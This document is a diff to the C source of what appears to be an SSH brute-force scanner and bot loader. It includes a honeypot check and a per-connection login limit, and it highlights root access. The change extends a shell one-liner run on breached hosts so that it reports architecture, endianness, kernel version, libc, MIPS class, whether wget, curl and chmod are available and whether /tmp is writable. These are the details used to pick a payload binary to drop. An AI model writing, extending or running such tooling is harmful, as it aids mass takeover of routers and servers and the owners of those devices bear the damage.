@@ -41,7 +41,13 @@
 #define SHOW_CURSOR "\033[?25h"
 
 #define SYSINFO \
-    "a=$(uname -m);echo \"$a|$(id -u)|$(case $a in *l|*el|x86*|i?86|amd64|aarch64)echo LE;;*)echo BE;;esac)|$(grep -oE mips3. /proc/cpuinfo 2>/dev/null||echo -)|$(which wget 2>/dev/null)|$(which curl 2>/dev/null)|$(which printf 2>/dev/null)|$(which chmod 2>/dev/null)|$([ -w /tmp ]&&echo W||echo N)\""
+    "a=$(uname -m);k=$(uname -r);" \
+    "e=BE;case \"$a\" in *l|*el|x86*|i?86|amd64|aarch64)e=LE;;esac;" \
+    "m=$(grep -oE 'mips3.' /proc/cpuinfo 2>/dev/null||echo -);" \
+    "libc=glibc;ls /lib/libuClibc* >/dev/null 2>&1 && libc=uclibc || ls /lib/ld-musl* >/dev/null 2>&1 && libc=musl;" \
+    "w=$(which wget 2>/dev/null);c=$(which curl 2>/dev/null);p=$(which printf 2>/dev/null);ch=$(which chmod 2>/dev/null);" \
+    "t=N;[ -w /tmp ]&&t=W;" \
+    "echo \"$a|$(id -u)|$e|$m|$k|$libc|$w|$c|$p|$ch|$t\""
 
 #define AUTH_PER_CONN 100
 
@@ -245,6 +251,9 @@ typedef struct {
     char arch[32];
     char endian[4];
     char mips_ver[16];
+    char kernel[128];
+    char libc[16];
+    char mips_class[16];
     int uid;
     int has_wget;
     int has_curl;
@@ -434,6 +443,38 @@ static int check_hp(rawssh_session *s) {
     return 1;
 }
 
+static void determine_mips_class(Result *r) {
+    memset(r->mips_class, 0, sizeof(r->mips_class));
+
+    if (strncmp(r->arch, "mips", 4) != 0)
+        return;
+
+    if (r->mips_ver[0] && strcmp(r->mips_ver, "-") != 0) {
+        if (strcmp(r->mips_ver, "mips32") == 0 || strcmp(r->mips_ver, "mips34") == 0) {
+            strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
+            return;
+        }
+    }
+
+    int major = 0, minor = 0, patch = 0;
+    if (r->kernel[0])
+        sscanf(r->kernel, "%d.%d.%d", &major, &minor, &patch);
+
+    if (r->libc[0] && strcmp(r->libc, "uclibc") == 0) {
+        if (major > 0 && (major < 2 || (major == 2 && minor < 6) || (major == 2 && minor == 6 && patch < 18)))
+            strncpy(r->mips_class, "mips-oldest", sizeof(r->mips_class) - 1);
+        else
+            strncpy(r->mips_class, "mips-old", sizeof(r->mips_class) - 1);
+    } else if (r->libc[0] && strcmp(r->libc, "musl") == 0) {
+        strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
+    } else {
+        if (major > 0 && (major < 3 || (major == 3 && minor < 2)))
+            strncpy(r->mips_class, "mips-old", sizeof(r->mips_class) - 1);
+        else
+            strncpy(r->mips_class, "mips", sizeof(r->mips_class) - 1);
+    }
+}
+
 static void parse_sysinfo(const char *raw, Result *r) {
     char buf[1024];
     strncpy(buf, raw, sizeof(buf) - 1);
@@ -444,7 +485,7 @@ static void parse_sysinfo(const char *raw, Result *r) {
             buf[i] = 0;
     }
 
-    char *fields[9] = {0};
+    char *fields[11] = {0};
     int fc = 0;
     char *p = buf;
 
@@ -452,7 +493,7 @@ static void parse_sysinfo(const char *raw, Result *r) {
         p++;
 
     fields[fc++] = p;
-    while (*p && fc < 9) {
+    while (*p && fc < 11) {
         if (*p == '|') {
             *p = 0;
             p++;
@@ -475,25 +516,36 @@ static void parse_sysinfo(const char *raw, Result *r) {
         strncpy(r->mips_ver, fields[3], sizeof(r->mips_ver) - 1);
 
     if (fc >= 5)
-        r->has_wget = (fields[4][0] && fields[4][0] != '\0' && strcmp(fields[4], "") != 0) ? 1 : 0;
+        strncpy(r->kernel, fields[4], sizeof(r->kernel) - 1);
 
     if (fc >= 6)
-        r->has_curl = (fields[5][0] && strcmp(fields[5], "") != 0) ? 1 : 0;
+        strncpy(r->libc, fields[5], sizeof(r->libc) - 1);
 
     if (fc >= 7)
-        r->has_printf = (fields[6][0] && strcmp(fields[6], "") != 0) ? 1 : 0;
+        r->has_wget = (fields[6][0] && strcmp(fields[6], "") != 0) ? 1 : 0;
 
     if (fc >= 8)
-        r->has_chmod = (fields[7][0] && strcmp(fields[7], "") != 0) ? 1 : 0;
+        r->has_curl = (fields[7][0] && strcmp(fields[7], "") != 0) ? 1 : 0;
 
     if (fc >= 9)
-        r->tmp_writable = (fields[8][0] == 'W') ? 1 : 0;
+        r->has_printf = (fields[8][0] && strcmp(fields[8], "") != 0) ? 1 : 0;
 
-    snprintf(r->info, sizeof(r->info), "ARCH:%s|UID:%d|ENDIAN:%s|MIPS:%s|WGET:%s|CURL:%s|PRINTF:%s|CHMOD:%s|TMP:%s",
+    if (fc >= 10)
+        r->has_chmod = (fields[9][0] && strcmp(fields[9], "") != 0) ? 1 : 0;
+
+    if (fc >= 11)
+        r->tmp_writable = (fields[10][0] == 'W') ? 1 : 0;
+
+    determine_mips_class(r);
+
+    snprintf(r->info, sizeof(r->info), "ARCH:%s|UID:%d|ENDIAN:%s|MIPS:%s|KERNEL:%s|LIBC:%s|CLASS:%s|WGET:%s|CURL:%s|PRINTF:%s|CHMOD:%s|TMP:%s",
              r->arch,
              r->uid,
              r->endian,
              r->mips_ver,
+             r->kernel,
+             r->libc,
+             r->mips_class[0] ? r->mips_class : "-",
              r->has_wget ? "YES" : "NO",
              r->has_curl ? "YES" : "NO",
              r->has_printf ? "YES" : "NO",
@@ -641,6 +693,9 @@ static void process(int idx) {
             memset(r.arch, 0, sizeof(r.arch));
             memset(r.endian, 0, sizeof(r.endian));
             memset(r.mips_ver, 0, sizeof(r.mips_ver));
+            memset(r.kernel, 0, sizeof(r.kernel));
+            memset(r.libc, 0, sizeof(r.libc));
+            memset(r.mips_class, 0, sizeof(r.mips_class));
             memset(r.info, 0, sizeof(r.info));
 
             if (hp == 0)
@@ -781,6 +836,12 @@ static void draw() {
                    C_GRAY, r->endian, C_RESET);
             if (r->mips_ver[0] && strcmp(r->mips_ver, "-") != 0)
                 printf(" %s%s%s", C_WHITE, r->mips_ver, C_RESET);
+            if (r->mips_class[0])
+                printf(" [%s%s%s]", C_YELLOW, r->mips_class, C_RESET);
+            if (r->kernel[0])
+                printf(" k:%s%s%s", C_GRAY, r->kernel, C_RESET);
+            if (r->libc[0])
+                printf(" %s%s%s", C_GRAY, r->libc, C_RESET);
             printf(" R:%s%s%s",
                    r->uid == 0 ? C_GREEN : C_RED,
                    r->uid == 0 ? "YES" : "NO",
